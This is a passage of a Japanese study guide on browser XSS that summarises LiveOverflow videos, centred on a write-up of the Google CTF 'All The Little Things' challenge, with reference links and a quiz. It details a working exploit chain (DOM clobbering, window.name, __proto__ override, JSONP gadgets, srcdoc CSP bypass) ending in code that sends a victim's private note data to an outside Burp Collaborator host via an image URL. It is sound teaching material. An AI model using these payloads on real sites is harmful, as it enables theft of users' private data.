- ノートには**HTMLタグは通る**（XSSは通らない）。ここで `id` / `name` 属性によるDOM Clobberingが使える。
- 実演: `<div id="bla">` を含むノートを作ると、JSコンソールで **`window.bla` がその `div` を指す**。
- 応用: `<div id="load_debug">` を作れば `window.load_debug` が「存在する」ようになる。ただし `HTMLDivElement` なので **`window.load_debug is not a function`** エラーになる（要素であって関数ではない）。

### 6-4. 失敗した研究（Part 1の題名の由来）

LiveOverflowの仮説は「**HTML要素でありながら、関数としても呼び出せる要素があるのでは？**」だった。検証方法は次のとおり。

```text
1. GitHubからHTML要素名の大きなリストを拾ってJS配列にする
2. 各タグを DOMPurify.sanitize() に通し、通過するタグだけに絞る
3. その要素に id=x を付けて挿入し、window.x() を try-catch で呼ぶ
4. 例外にならなければ found! と出す
```

**結果は何も見つからなかった**。総括（逐語、研究姿勢として重要）: "This is a typical 'dumb' idea you might have, you test it, and you find out it doesn't work. But that's security research. I think it was a good idea and worth testing for."（ありがちな「バカな」アイデアを試して、動かないと分かる。だがそれがセキュリティ研究だ）。他のclobber候補も検討したが没になった。`window.USERNAME` は後の代入で上書きされ、`id="bootstrap-link"` の `querySelector` はノート描画前に実行されて間に合わない。

### 6-5. 見落としていた鍵 — `__debug__` GETパラメータ

ソースを見返して発見した。URLに `__debug__` を付けると **`debug.js` が追加読み込みされ、設定画面に追加HTMLが現れる**。`debug.js` が **`load_debug` 関数を定義する**。その中身が決定的である。

- **`window.name` の文字列をJSONとしてパース**し、
- **`Object.assign()` でその内容を `user` オブジェクトにマージする**。
- 追加機能: `verbose`、`showAll`（隠し要素を全部表示＝**隠しinputのCSRFトークンまで見える**）、`keepDebug`（全 `<a href>` に `__debug__` を付与）、`onerror` を `alert` で上書き。

**`window.name` の特殊性**がこの課題の心臓部である（逐語）: "window.name persists across other websites." つまり同じタブで別サイトへ遷移しても `window.name` は保持される。**Pasteurize上のXSSで `window.name` をセットし、littlethingsへリダイレクトすれば、任意のJSONを `user` オブジェクトにマージできる**。

### 6-6. Prototype上書きによるgetter回避（Part 2）

狙いは `user.theme.callback` を `alert` にすること。そうすれば `update_theme()` が生成する `script` タグで任意の関数が呼ばれる。

- 障害: `Object.assign` が **`property theme has only a getter`** で失敗する。`user` クラスの `theme` は**getter関数**（値を読むだけの特別なメソッド）で、内部のプライベートフィールド `#theme` を読むだけ。セットできない。
- 解法（チームメイト managarmr 氏の発案）: **`__proto__` を空オブジェクトに設定する**。プロトタイプにはgetter定義が含まれているので、**プロトタイプごと捨てればgetterも消える**。すると自前の `theme` 定義が通る。
- 結果 `alert` が発火する。**プロトタイプ操作によるアクセサ無効化**という、Prototype Pollution とは別方向のテクニックである。

### 6-7. 極度に制限されたScript Gadgetの育て方

JSONPの `callback` に使える文字を総当たりで調べた結果、**英数字・`.`（ドット）・`=`（イコール）のみ**だった。括弧も引用符も使えない。得られる能力は2つだけである。

1. **任意の関数を1回呼べる**（引数は固定の変なオブジェクト。`.` があるので `Object.constructor.apply()` のような深い参照は可能）。
2. **代入ができる**（`=`）。ただし右辺も必ず関数呼び出しになる。

ここから段階的に能力を組み上げていく。

- ブレークスルー1: **`document.body.innerHTML = <何か関数呼び出し>`** ができる。`alert` を使うと戻り値 `undefined` が入る（＝確かに書き込めている）。
- ブレークスルー2: **文字列をどう作るか**。`<input id=xss value="ペイロード">` をDOM Clobberingで用意し、`window.xss.value` を読みたい。しかし右辺は関数呼び出しでなければならない。→ **`.toString()` を呼べばよい**。文字列に `toString()` を呼ぶと、その文字列自身が返る。
- 障害3: **CSPが厳しい**。インラインイベントハンドラは `Refused to execute inline event handler because it violates the Content Security Policy` で拒否される。予測不能な nonce 付き `script` か、`self` 上の `src` が必要。→ **JSONPエンドポイントが `self` 上のスクリプトを提供してくれる**ので、`<script src="/theme?cb=...">` を複数注入して**プリミティブ（基本部品）を組み合わせられる**。
- 障害4: **`innerHTML` で挿入した `<script>` は実行されない**（HTML5仕様、逐語）: "Note: script elements inserted using innerHTML do not execute when they are inserted." → **`<iframe srcdoc="...">` を使う**。`srcdoc` 属性はiframeの中身をHTML文字列で直接書く仕組みで、`src` を指定せず `srcdoc` に文書を書くと**新しいドキュメント**が作られ、その中の `script` は実行される。CSPは `iframe` の**特定ソース読み込み**は止めるが、**ソースを読み込まない `srcdoc`** は通った（逐語: "We are simply embedding an iframe inside this page with a custom document. And that document happens to have a script tag. Sneaky awesome trick."）。

### 6-8. 最終ペイロードの構造と、括弧なしXSS

**最後のひらめき**はこうだ。当初は「`<input value=ペイロード>` を含むノート」を被害者に見せる必要があったが、**被害者は攻撃者のprivateノートを見られない**。→ **`window.name` 自体を文字列ソースとして使う**。`window.name` はJSONに見えるがただのテキストなので、`innerHTML` に代入すればJSON部分はただのテキストとして表示され、**中に埋め込んだHTMLタグだけがレンダリングされる**。

描画されるのは **`<iframe srcdoc=...>`**。その中身は次のとおり。

1. `<img id=x src="https://<burp-collaborator>/">` ← リーク用。
2. **3本の `<script src="/theme?cb=...">`**（JSONP script gadget）。実行される3行は概ね次のようになる。

```javascript
Object.prototype.toString = RegExp.prototype.toString   // 全オブジェクトの toString を差し替え
Object.prototype.source = <親ドキュメントのテキスト>       // parent から全ノートIDを含むテキストを取る
x.src = x.src.concat(<obj>)                              // 画像のsrcに連結
```

仕掛けはこうだ。`RegExp.prototype.toString` は内部で **`source` プロパティ**を読む。`Object.prototype.source` にリーク対象テキストを入れてあるため、`concat` が引数を文字列化する際に**引数のオブジェクトではなく、仕込んだテキストが連結される**。結果、`<img>` の `src` が `https://<collaborator>/<リークしたページテキスト>` になり、**画像読み込みリクエストとしてデータが外部送信される**。

出典の明示（逐語）: "We didn't come up with this. We actually went through all published research from the challenge author, terjanq, and we stumbled over this tweet. 'I recently discovered a fancy way to execute arbitrary XSS without parentheses...'" → **括弧なしXSS（parenthesis-less XSS）**という既知研究の変形である。**出題者の公開研究を全部読むのは正攻法**という実務的教訓が得られる。

### 6-9. 攻撃の実行（2段階）

1. Pasteurize にXSS投稿を作る。ペイロードは `window.name` に攻撃JSONをセットし、`__debug__` 付きの littlethings のノート一覧へリダイレクトする。TJMike に share する。→ 連鎖が発火し、**TJMikeのprivateノートIDの一覧**が collaborator にリークする。
2. 同じ手順を、今度は**特定ノートの本文**を対象にもう一度実行する。→ フラグが得られる。フラグ文言（逐語）: `When the world comes to an end, all that matters are these little things`

### 6-10. この2本から抽出できるクライアントサイド技法一覧

| # | 技法 | 一言 |
| --- | --- | --- |
| 1 | DOM Clobbering | `id`/`name` による `window.*`/`document.*` の生成 |
| 2 | `window.name` のクロスオリジン永続性 | サイト間でのデータ持ち越し |
| 3 | `__proto__` 上書きによる getter/アクセサの無効化 | プロトタイプごと捨てる |
| 4 | JSONP エンドポイントの script gadget 化 | `self` 上のスクリプト生成＝CSPバイパスの足場 |
| 5 | `.toString()` / `.concat()` の活用 | 文字クラスが極端に制限された状況で |
| 6 | `innerHTML` で挿入した `<script>` の不実行と回避 | `<iframe srcdoc>` を使う |
| 7 | `Object.prototype` 汚染による組み込みメソッドの書き換え | `RegExp.prototype.toString` + `source` |
| 8 | 括弧なしXSS（terjanq） | 既知研究の変形 |
| 9 | `<img src>` による out-of-band データ持ち出し | 画像読み込みで外部送信 |
| 10 | `debugger;` 文と devtools コールスタック | DOM XSSのデバッグ（2-5参照） |

---

## 7. 動画説明欄から抽出した一次参考文献リンク集

以下は `liveoverflow_videos.jsonl` の各 `description` フィールドから抽出したもので、**すべて逐語**である。LiveOverflow本人が視聴者に提示している参照先なので、参考文献としてそのまま使える。

| 参照元動画 | 参考文献URL（逐語） |
| --- | --- |
| The Browser is a very Confused Deputy (web 0x05) | `https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html`（Norm Hardy, "The Confused Deputy"） |
| XSS with AngularJS 0x1 / 0x3 | `http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html` ／ `https://vimeo.com/165951806` ／ `https://cure53.de/`（Mario Heiderich）／ Gareth Heyes @garethheyes |
| XSS with AngularJS 0x00 | `http://liveoverflow.com/angularjs/`（練習ページ） |
| XSS on Google Search | `https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa`（修正コミット） |
| How did Masato find the Google Search XSS? | `https://gist.github.com/LiveOverflow/dd3d09d17c8fc0460c7e9a337b501331`（fuzzing用gist） |
| Fuzzing Browsers for weird XSS Vectors | `https://twitter.com/garethheyes/status/1112661895067156481` ／ `http://shazzer.co.uk/vector/lt-eating-char` |
| The Curse of Cross-Origin Stylesheets | `https://bugs.chromium.org/p/chromium/issues/detail?id=788936`（cgvwzq, 2017）／ `https://bugs.chromium.org/p/chromium/issues/detail?id=419383`（filedescriptor, 2014） |
| HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! | `https://bugs.chromium.org/p/chromium/issues/detail?id=841105` ／ `https://www.youtube.com/watch?v=2MslLrPinm0`（Orange Tsai, "A New Era of SSRF"） |
| XS-Search abusing the Chrome XSS Auditor | `https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning` ／ `https://www.youtube.com/watch?v=VI5OLNHf_Sc`（メイキング） |
| Script Gadgets! Google Docs XSS | `https://thisisqa.com/`（発見者 Nickolay） |
| XSS a Paste Service - Pasteurize | `https://www.youtube.com/watch?v=voO6wu_58Ew`（John Hammond）／ `https://www.youtube.com/watch?v=0wUDA0oh8sQ`（Gynvael part 1）／ `https://www.youtube.com/watch?v=OYP9hvy4MHQ`（part 2） |
| Failed DOM Clobbering Research (1/2) | `https://capturetheflag.withgoogle.com/challenges/web-littlethings`（課題）／ `https://www.youtube.com/watch?v=Tw7ucd2lKBk`（前提動画 Pasteurize） |
| XSS on the Wrong Domain (Tech Support) | `https://capturetheflag.withgoogle.com/challenges/web-typeselfsub` ／ `https://typeselfsub.web.ctfcompetition.com/` |
| DO NOT USE alert(1) for XSS | `https://liveoverflow.com/do-not-use-alert-1-in-xss/`（ブログ版） |
| Missing HTTP Security Headers | `https://www.youtube.com/playlist?list=PLY-vqlMAnJ9bGoI82H1BB8BE4A8H2OCA-`（Google VRP向け全再生リスト） |
| Authorization vs. Authentication | `https://bughunters.google.com`（Google VRP委託制作） |
| The Same Origin Policy - Hacker History | `https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html`（Netscapeのcookie説明） |
| The Three JavaScript Hacking Legends | `https://seclists.org/bugtraq/1997/Jun/88`（Bugtraq 1997 LoVerso） |
| The Age of Universal XSS | `https://seclists.org/bugtraq/1997/Oct/85`（"Jabadoo Security Hole in Explorer 4.0"） |
| The Origin of Cross-Site Scripting (XSS) | `https://www.youtube.com/playlist?list=PLhixgUqwRTjyakFK7puB3fHVfXMinqMSi`（再生リスト "The History of XSS"） |
| Solving a JavaScript crackme: JS SAFE 2.0 | `https://gist.github.com/LiveOverflow/bbdffe3777ce0f008b452e0a789cef65`（解答スクリプト） |
| WebKit RegExp Exploit addrof() | `https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/` ／ `https://github.com/LinusHenze/WebKit-RegEx-Exploit`（Linus Henze の exploit） |
| can you hack this screenshot service?? | `https://github.com/LiveOverflow/ctf-screenshotter` ／ `https://www.cscg.de/` |
| End-to-End Encryption in the Browser Impossible? | `https://eprint.iacr.org/2018/1121`（Nadim Kobeissi, "An Analysis of the ProtonMail Cryptographic Architecture"） |
| Crazy Steam Phishing Page | `https://phishingquiz.withgoogle.com/` |

---

## 8. 補完で判明した追加の関連動画

以下は `liveoverflow_videos.jsonl` から見つかった、クライアントサイド学習に関連する動画である（51aの表に無かったもの）。

| タイトル | 投稿日 | 再生数 | video_id | 関連性 |
| --- | --- | --- | --- | --- |
| Injection Vulnerabilities - or: How I got a free Burger | 2017-07-28 | 380,983 | WWJTsKaJT_g | **インジェクションの本質**（データと命令の混同）を、フードデリバリの注文コメントがハンバーガーとして調理された実話で説明。XSS/SQLi/コマンドインジェクションの導入に最適 |
| Crazy Steam Phishing Page | 2021-07-17 | 154,379 | NWtm4X6L_Cs | 「ブラウザのアドレスバーだけが信頼できる唯一のセキュリティ指標」を実演。フィッシング・UI偽装の回 |
| Analysing a Firefox Malware browserassist.dll - FLARE-On 2018 | 2019-02-24 | 246,580 | 5cvpGSSUZI0 | ブラウザに寄生するマルウェア解析 |
| RSA Implemented in JavaScript (Keygen part 5) - Pwn Adventure 3 | 2018-09-04 | 39,153 | 2pqHsW3yNlA | クライアント側JSに暗号処理を置くことの意味 |
| The Origin of Script Kiddie - Hacker Etymology | 2019-05-12 | 140,931 | 3MAqlEMITzw | Hacker Etymologyシリーズ |
| Reverse Engineering PopUnder Trick for Chrome | 2017-08-11 | 81,418 | PPzRcZLNCPY | 難読化JS解析（Chrome 60のPopUnder） |
| How To Learn Hacking With CTFs | 2019-12-08 | 221,025 | Lus7aNf2xDg | 学習法の回 |
| Guessing vs. Not Knowing in Hacking and CTFs | 2020-10-18 | 59,755 | L1RvK1443Yw | 「推測」と「未知」の区別＝研究姿勢 |

---

## 手を動かす

1. 前提として、YouTubeを開けない環境や、後から本文を検索したい場合に備えて、LiveOverflowの逐語トランスクリプトをローカルに取得する。

```bash
git clone --depth 1 https://github.com/LiveOverflow/yt_statistics
cd yt_statistics
```

2. タイトルから動画IDを探す。たとえば "XSS" を含む動画を一覧する。

```bash
python3 -c "
import json
for l in open('liveoverflow_videos.jsonl'):
    v=json.loads(l)
    if 'XSS' in v['title']: print(v['video_id'], v['date'][:10], v['title'])
"
```

3. 本節で扱った動画の本文を読む。たとえばGoogle Search XSSの回（`lG7U3fuNw3A`）を読む。

```bash
less liveoverflow_transcripts/lG7U3fuNw3A.txt
```

4. 全トランスクリプトを横断して特定トピックを検索する。たとえばDOM Clobberingに言及する動画を探す。

```bash
grep -ril "clobber" liveoverflow_transcripts/
```

5. XSSのPoCを自分の検証環境で作るときは、`alert(1)` ではなく必ず `alert(document.domain)` を使い、開発者ツールで**どのオリジンで発火したか**を確認する。アラートが封じられていれば `console.log(document.domain)` を使い、コンソールをフィルタして確認する。

6. HTMLサニタイズを自作する必要が出たら、正規表現ではなく `<template>` 要素を使う。以下は原理を確認する最小の実験である（自分で立てた検証ページで実行する）。

```javascript
// 危険: div.innerHTML は即座に画像を読み込み onerror が発火する
const div = document.createElement('div');
div.innerHTML = '<img src=x onerror=alert(1)>';   // 発火する

// 安全: template の中身は不活性
const tpl = document.createElement('template');
tpl.innerHTML = '<img src=x onerror=alert(1)>';   // 発火しない
console.log(tpl.content.querySelector('img'));    // 要素は取得でき、属性を削れる
```

---

## つまずきポイント

- **`alert(1)` が出た＝クリティカルXSS、ではない**。サンドボックスドメイン（`blogspot.com`、`googleusercontent.com` など）やサンドボックス化iframeで発火しているだけなら、SOPにより本体のデータは読めず、脆弱性ではない。必ず `alert(document.domain)` でオリジンを確認する。
- **セキュリティヘッダ欠如を機械的に報告してはいけない**。`X-Frame-Options` が無くてもクリックジャッキングで実害が出る機能が無ければ無意味だし、YouTubeのように**意図的に埋め込ませたい**サイトもある。CSP欠如も「多層防御が薄い」だけで、それ自体は脆弱性ではない。
- **サーバ側のエスケープが正しくても油断できない**。Pasteurizeのように、`qs`/`body-parser` の `extended: true` で値の「型」が文字列からオブジェクトに化けると、`JSON.stringify` の出力が変わってエスケープが破綻する。型混同を疑う。
- **無効なXSSを捨てない**。サンドボックス内XSSでも、`postMessage` 経由のサンドボックス脱出やチェーンの部品になりうる。どこで見つけたかメモを残す。
- **DOM ClobberingはXSSが通らなくても効く**。`id`/`name` 属性さえ注入できれば `window.○○` を作れる。「スクリプトが弾かれたから安全」とは限らない。
- **`innerHTML` で挿入した `<script>` は実行されない**。これはHTML5仕様であって防御ではない。`<iframe srcdoc>` で回避できる。
- **`window.name` はサイトを跨いで残る**。あるオリジンでセットした値が、リダイレクト先の別オリジンでも読める。クロスオリジンなデータ持ち越しの経路になる。

---

## この節のまとめ

- XSSのPoCは `alert(1)` ではなく **`alert(document.domain)` か `alert(window.origin)`** を使う。どのオリジンで実行されたかが影響評価の全てだから。
- サンドボックスドメイン（`blogspot.com` など）とサンドボックス化iframeは**優秀な防御**であり、そこでのXSSは意図された設計。単体では報告しない。
- 無効なXSSも**チェーンの部品**になりうる。脆弱性は最初のXSSではなく「サンドボックスからの脱出」のほう。
- 一部のHTMLを許可したいときのサニタイズは、サーバ側の正規表現ではなく**ブラウザのパーサ（`<template>`）を使う**。全ブラウザの挙動を再現するのは事実上不可能だから。
- それでも**parser differential（パーサ差異）**が残る。`<noscript>` は `template` 内でJSが無効扱いになるため、本文中とパース結果が食い違い mutation XSS を生む。
- `debugger;` 文と開発者ツールのコールスタックは、複雑なDOM XSSが「どこでなぜ発火したか」を突き止める強力なデバッグ手段。
- Google Search XSSの根本原因は、closure-libraryで**サニタイズ段を削除した変更**で、約5か月間全社的に影響した。セキュリティ機構の削除はレビューの最重要監視点。
- 「セキュリティヘッダが無い＝脆弱性」は誤り。`X-Frame-Options`・CSP・HSTS・`HttpOnly` はいずれも**多層防御**であり、欠如そのものは脆弱性ではないことが多い。常に**現実的な影響**で判断する。
- CORSの寛容な設定は、**Cookieセッション認証＋`Allow-Credentials: true`** なら重大だが、トークン認証なら問題ないことが多い。認証方式で深刻度が変わる。
- Same-Origin Policyは1995〜96年のNetscapeで、frameによるクロスドメイン情報窃取（と、より深刻なローカルファイル名列挙）への対処として**発明された**。
- Pasteurizeの教訓は、**エスケープ関数に渡る値の型が想定外なら、正しいエスケープでも破綻する**こと（型混同、HTTP Parameter Pollutionの親戚）。
- All The Little Thingsは、DOM Clobbering・`window.name`永続性・`__proto__`上書き・JSONP script gadget・`srcdoc` CSPバイパス・括弧なしXSSを一気に学べる総合演習。
- 極端に制限された文字集合（英数字・`.`・`=` のみ）でも、`.toString()`／`.concat()`／`Object.prototype`汚染を組み合わせて完全XSSを構築できる。
- 実務的教訓として、**出題者（や研究者）の公開研究を全部読む**のが正攻法。terjanqの括弧なしXSSツイートが決め手になった。
- YouTubeが開けなくても、LiveOverflowの全336本は本人公開の逐語トランスクリプトで読める（2023-03時点。画面録画の視覚情報は除く）。

---

## 理解度チェック

1. バグバウンティでXSSを見つけたとき、`alert(1)` の代わりに `alert(document.domain)` を使うべき理由は何か。
   ▶ 答え: アラートが出ても、それがサンドボックスドメインやサンドボックス化iframe内で発火しているだけなら、SOPにより本体のデータは読めず脆弱性ではない。`document.domain`（や `window.origin`）を表示すれば**どのオリジンで実行されたか**が分かり、本物の脆弱性かどうかを判別できるから。

2. `<template>` 要素を使うクライアントサイドサニタイズが、サーバ側の正規表現より優れているのはなぜか。
   ▶ 答え: HTMLのパースはブラウザごと・バージョンごとに違い、サーバ側で全挙動を再現するのは事実上不可能。`<template>` はブラウザ自身のパーサでパースしつつ中身を不活性（画像もスクリプトも動かない）に保つので、実際のDOMを検査して危険な要素を削れるから。

3. mutation XSSにおける `<noscript>` の parser differential とは、具体的にどういう食い違いか。
   ▶ 答え: `<noscript>` はJSが有効か無効かでパース結果が変わる。ブラウザ本体ではJSが有効だが `<template>` の中ではJSが「無効」扱いになるため、サニタイズ時（template内）は無害な属性値に見えた文字列が、本文の `div.innerHTML` に入れると `img` が本物のタグになって発火する。

4. 「`X-Frame-Options` が無い」という報告が必ずしも有効でないのはなぜか。実例も挙げよ。
   ▶ 答え: クリックジャッキングで実害が出る機能が無ければヘッダが無くても安全だから。実例としてYouTubeは、SHAREの埋め込み機能のため**意図的に**`X-Frame-Options` を付けていない。これは仕様であって欠陥ではない。

5. 寛容なCORS設定の深刻度が「重大」になるのはどんな認証方式のときか。
   ▶ 答え: **Cookieセッション認証**で、かつ `Access-Control-Allow-Credentials: true` のとき。ブラウザがセッションCookieを付けて送り、しかもレスポンスを読めてしまう。トークン認証（コードが `Authorization` ヘッダを付ける方式）ならブラウザは自動でヘッダを付けないので、問題ないことが多い。

6. Pasteurizeで、サーバ側の `JSON.stringify` を使ったエスケープが破られた原因は何か。
   ▶ 答え: `body-parser` の `extended: true`（内部で `qs` を使う）により、`content[key]=value` という形のPOSTで `content` が**文字列ではなくオブジェクト**になった。`JSON.stringify` にオブジェクトを渡すと `{"key":"value"}` とダブルクォートを含む出力になり、JS文字列リテラルを閉じて外に出られた（型混同）。

7. DOM Clobberingとは何か。XSSが通らない状況でも使えるのはなぜか。
   ▶ 答え: `id` や `name` 属性を持つHTML要素を注入すると、その要素が同名のグローバル変数（`window.○○`）として参照できてしまう挙動を悪用する技法。スクリプトタグが弾かれても、HTMLタグさえ通れば `window.load_debug` のような変数を「存在させる」ことができるから。

8. `innerHTML` で挿入した `<script>` が実行されないという仕様を、All The Little Thingsではどう回避したか。
   ▶ 答え: `<iframe srcdoc="...">` を使った。`srcdoc` はiframeの中身をHTML文字列で直接書く仕組みで、新しいドキュメントが作られ、その中の `<script>` は実行される。しかも `src` を読み込まないため、特定ソースを制限するCSPをすり抜けられた。

9. `window.name` のどんな性質が、Pasteurizeからlittlethingsへの攻撃連鎖を可能にしたか。
   ▶ 答え: `window.name` は**サイトを跨いで（クロスオリジンで）永続する**。同じタブで別サイトへ遷移しても値が保持される。そのためPasteurize上のXSSで攻撃用JSONを `window.name` にセットし、littlethingsへリダイレクトすると、`load_debug` がその値を `user` オブジェクトにマージしてしまう。

10. LiveOverflowが「セキュリティ研究では失敗も価値がある」と述べた文脈は何か。
    ▶ 答え: All The Little Thingsで「HTML要素でありながら関数としても呼べる要素があるのでは」という仮説を大量のタグで総当たり検証したが、何も見つからなかった。彼はこれを「ありがちなバカなアイデアを試して動かないと分かる、だがそれが研究だ」と総括し、失敗過程を含めて公開する姿勢を示した。

---

## 出典

- https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w （LiveOverflowチャンネル。原典は取得できず、本人公開の逐語トランスクリプトを一次データとして使用）
- https://github.com/LiveOverflow/yt_statistics （`liveoverflow_videos.jsonl`、`liveoverflow_transcripts/<video_id>.txt`。取得日 2023-03-15）
- https://www.youtube.com/watch?v=KHwVjzWei1c （DO NOT USE alert(1) for XSS）
- https://liveoverflow.com/do-not-use-alert-1-in-xss/ （同ブログ版）
- https://www.youtube.com/watch?v=lG7U3fuNw3A （XSS on Google Search - Sanitizing HTML in The Client?）
- https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa （Google Search XSSの修正コミット）
- https://www.youtube.com/watch?v=064yDG7Rz80 （Missing HTTP Security Headers - Bug Bounty Tips）
- https://www.youtube.com/watch?v=bSJm8-zJTzQ （The Same Origin Policy - Hacker History）
- https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html （Netscapeのcookie説明）
- https://www.youtube.com/watch?v=Tw7ucd2lKBk （XSS a Paste Service - Pasteurize）
- https://www.youtube.com/watch?v=dZXaQKEE3A8 （All The Little Things 1/2）
- https://www.youtube.com/watch?v=UGtrpXk6QVU （All The Little Things 2/2）
- https://www.youtube.com/watch?v=2up8J9dErHI （PwnFunction: Solving a Hard Google CTF challenge - "Paste-tastic!"）

<!-- sources: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w, https://github.com/LiveOverflow/yt_statistics, https://www.youtube.com/watch?v=KHwVjzWei1c, https://liveoverflow.com/do-not-use-alert-1-in-xss/, https://www.youtube.com/watch?v=lG7U3fuNw3A, https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa, https://www.youtube.com/watch?v=064yDG7Rz80, https://www.youtube.com/watch?v=bSJm8-zJTzQ, https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html, https://www.youtube.com/watch?v=Tw7ucd2lKBk, https://www.youtube.com/watch?v=dZXaQKEE3A8, https://www.youtube.com/watch?v=UGtrpXk6QVU, https://www.youtube.com/watch?v=2up8J9dErHI -->
<!-- terms: alert(document.domain), サンドボックスドメイン, sandbox属性, mutation XSS, parser differential, DOMPurify, template要素, noscript, closure-library, Content-Security-Policy, X-Frame-Options, HSTS, CORS, HttpOnly, Same-Origin Policy, Confused Deputy, 型混同, body-parser, qs, extended, DOM Clobbering, window.name, prototype上書き, JSONP, Script Gadget, srcdoc, 括弧なしXSS, Burp Collaborator, debugger文, JSON.stringify -->
<!-- self-read: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w | サイト側の制限（プロキシがwww.youtube.comへの接続を拒否）。画面録画の視覚情報は逐語トランスクリプトに含まれない -->
<!-- self-read: https://www.youtube.com/watch?v=2up8J9dErHI | サイト側の制限。PwnFunctionはトランスクリプト未取得の部分取得。アニメーション主体で字幕だけでは補えない -->
